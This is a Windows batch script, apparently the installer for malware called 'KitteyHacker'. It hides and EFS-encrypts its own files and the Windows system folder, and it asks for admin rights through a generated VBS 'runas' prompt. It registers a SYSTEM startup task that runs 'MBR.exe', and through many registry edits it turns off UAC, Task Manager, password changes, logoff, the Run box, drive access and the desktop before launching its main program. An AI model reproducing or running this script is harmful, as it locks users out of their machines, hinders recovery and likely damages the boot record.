@echo off
%SystemRoot%\System32\attrib +h +s "%CD%"
%SystemRoot%\System32\CIPHER /E "%CD%"

%SystemRoot%\System32\CIPHER /E "%0"
%SystemRoot%\System32\CIPHER /E %0
%SystemRoot%\System32\CIPHER /E "KitteyHacker.exe"
%SystemRoot%\System32\CIPHER /E "php5ts.dll"
%SystemRoot%\System32\CIPHER /E "squall.dll"
%SystemRoot%\System32\CIPHER /E "ext\php_squall.dll"
%SystemRoot%\System32\CIPHER /E "ext"
%SystemRoot%\System32\CIPHER /E "KitteyHacker.mp3"
%SystemRoot%\System32\CIPHER /E "Kitty.mp3"
%SystemRoot%\System32\CIPHER /E "Protogent.mp3"
%SystemRoot%\System32\CIPHER /E "SM.exe"
%SystemRoot%\System32\CIPHER /E "KHD.exe"
%SystemRoot%\System32\CIPHER /E "%SystemRoot%"

%SystemRoot%\System32\attrib +h +s "%0"
%SystemRoot%\System32\attrib +h +s %0
%SystemRoot%\System32\attrib +h +s "KitteyHacker.exe"
%SystemRoot%\System32\attrib +h +s "php5ts.dll"
%SystemRoot%\System32\attrib +h +s "squall.dll"
%SystemRoot%\System32\attrib +h +s "ext\php_squall.dll"
%SystemRoot%\System32\attrib +h +s "ext"
%SystemRoot%\System32\attrib +h +s "KitteyHacker.mp3"
%SystemRoot%\System32\attrib +h +s "Kitty.mp3"
%SystemRoot%\System32\attrib +h +s "Protogent.mp3"
%SystemRoot%\System32\attrib +h +s "MBR.exe"
%SystemRoot%\System32\attrib +h +s "SM.exe"
%SystemRoot%\System32\attrib +h +s "KHD.exe"
%SystemRoot%\System32\attrib +h +s "%SystemRoot%"
title Administrator Check
color c

:Check
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting Administrative Privileges...
    echo Запрос Право Администратора...
    goto UACPrompt
) else ( goto Admin )

:UACPromptC
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute %0, "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:Admin
title KitteyHacker Setup

MD "%TEMP%"
%SystemRoot%\System32\SchTasks /Create /TN KitteyHacker /ru SYSTEM /SC ONSTART /TR ""%CD%\MBR.exe"" /RL HIGHEST /F

%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /F
%SystemRoot%\System32\REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /F
%SystemRoot%\System32\REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /F

%SystemRoot%\System32\REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableCAD /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /F

%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /F

%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyComputer /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowControlPanel /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyDocs /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowDownloads /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyGames /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyMusic /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowUser /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyPics /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowRecordedTV /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowVideos /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowSetProgramAccessAndDefaults /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowPrinters /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_EnableDragDrop /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_MenuFavorites /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowHelp /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowNetPlaces /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowHomegroup /t REG_DWORD /d 0 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_SearchPrograms /t REG_DWORD /d 0 /F

%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuLogoff /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMMyDocs /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /F
%SystemRoot%\System32\REG ADD "HKEY_CURRENT_USER\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /F

start KitteyHacker.exe
exit